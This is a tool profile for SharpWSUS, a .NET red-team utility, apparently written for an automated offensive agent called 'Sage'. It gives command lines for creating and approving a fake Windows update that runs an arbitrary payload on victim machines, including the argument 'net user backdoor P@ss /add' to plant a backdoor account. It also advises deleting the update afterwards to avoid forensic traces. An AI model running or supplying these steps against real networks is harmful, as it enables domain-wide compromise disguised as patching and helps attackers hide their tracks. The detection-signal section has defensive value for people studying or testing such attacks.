---
name: SharpWSUS
category: lateral-movement
subcategories: [wsus-abuse, patch-management-abuse, lateral-movement]
tradecraft_tags: [wsus, windows-update, lateral-movement, wsuspect, dotnet, apollo-runnable]
mitre_attack:
  - id: T1072
    name: Software Deployment Tools
source:
  url: https://github.com/nettitude/SharpWSUS
  license: Apache-2.0
  maintained: true
binary_type: .net-assembly
binary_filename: SharpWSUS.exe
supported_os: [windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  WSUS server communications (HTTP/HTTPS to WSUS server) for non-WSUS processes are
  anomalous. Creating fake update packages on the WSUS server generates IIS logs.
  Windows Update agent executing unexpected binaries generates Event 4688. WSUS database
  modifications are auditable if SQL Server auditing is configured.
usage_examples:
  - description: Enumerate WSUS server settings on current machine
    args: "SharpWSUS.exe locate"
  - description: Inspect WSUS server for injection opportunities
    args: "SharpWSUS.exe inspect"
  - description: Create a malicious update targeting specific computers
    args: "SharpWSUS.exe create /payload:'C:\\Windows\\Temp\\payload.exe' /args:'whoami' /title:'Security Update KB12345'"
  - description: Approve the malicious update for distribution
    args: "SharpWSUS.exe approve /updateid:<GUID> /computername:VICTIM.domain.local"
  - description: Delete the malicious update (cleanup)
    args: "SharpWSUS.exe delete /updateid:<GUID>"
opsec_notes: |
  WSUS abuse requires access to the WSUS server (typically requires admin rights or
  WSUS Administrator role). The malicious update appears as a legitimate Windows update
  in the Windows Update history on victim machines — difficult to distinguish without
  auditing the WSUS database. Cleanup is critical: delete the update entry after
  exploitation. WSUS abuse affects all machines that receive updates from that WSUS
  server — be surgical about targeting.
gotchas: |
  Requires network access to the WSUS server AND sufficient privileges to create
  update packages (WSUS Administrator role or administrative access to the WSUS server
  itself). The payload must be a signed binary or the PSExec-style execution may fail
  depending on client-side WSUS security settings. SharpWSUS targets HTTP-only WSUS
  deployments (not HTTPS — SSL validates the update signature). HTTPS WSUS requires
  a valid WSUS certificate for package signing, which is a higher bar.
related_ttps: [sharpsccm, crackmapexec, sharpexec]
alternatives: [sharpsccm, manual-wsus-injection, wsuspect]
common_args:
  locate:
    description: Find WSUS server URL from registry on current machine
    typical_values: [flag-only]
  inspect:
    description: Connect to WSUS server and enumerate update groups and computers
    typical_values: [flag-only]
  create:
    description: Create a malicious update package on the WSUS server
    typical_values: [flag-only]
  /payload:
    description: Path to the executable to deliver via fake update
    typical_values: ["C:\\\\Windows\\\\Temp\\\\payload.exe"]
  /args:
    description: Arguments for the payload executable
    typical_values: ["whoami", "net user backdoor P@ss /add"]
  approve:
    description: Approve the fake update for delivery to a target computer
    typical_values: [flag-only]
  /updateid:
    description: GUID of the created update (from create output)
    typical_values: ["<GUID>"]
  /computername:
    description: Target computer to approve the update for
    typical_values: ["VICTIM.north.sevenkingdoms.local"]
  delete:
    description: Remove the fake update from WSUS server (cleanup)
    typical_values: [flag-only]
last_updated: 2026-05-29
---

# SharpWSUS

A .NET assembly for Windows Server Update Services (WSUS) lateral movement. When a
WSUS server is accessible without HTTPS enforcement, SharpWSUS can inject a malicious
"update" that appears as a legitimate Windows Update — executing arbitrary payloads
on all machines that receive updates from that WSUS server.

## Why WSUS Matters

WSUS servers often:
- Manage hundreds or thousands of endpoints
- Are trusted completely (updates are signed and pushed automatically)
- Run on servers with domain-level service accounts
- Lack the same EDR coverage as user endpoints

Compromising WSUS = lateral movement to all managed endpoints without any other exploits.

## Typical use cases
- Lateral movement to all WSUS-managed endpoints in the domain
- Persistent code execution disguised as Windows Update
- Privilege escalation if the WSUS server itself is a high-value target

## How Sage uses this
When SharpHound or Seatbelt identifies a WSUS-configured environment (HKLM\Software\Policies\
Microsoft\Windows\WindowsUpdate), Sage checks whether the WSUS server is HTTP (not HTTPS).
If HTTP: SharpWSUS is the lateral movement path. If HTTPS: certificate required (higher bar).

## Apollo-specific note
.NET assembly — Apollo inline_assembly compatible.

## Cleanup Sequence

Always delete the malicious update after exploitation:
```
SharpWSUS.exe delete /updateid:<GUID>
```
Failure to clean up leaves the fake update in the WSUS database and Windows Update
history on victim machines — a clear forensic artifact.
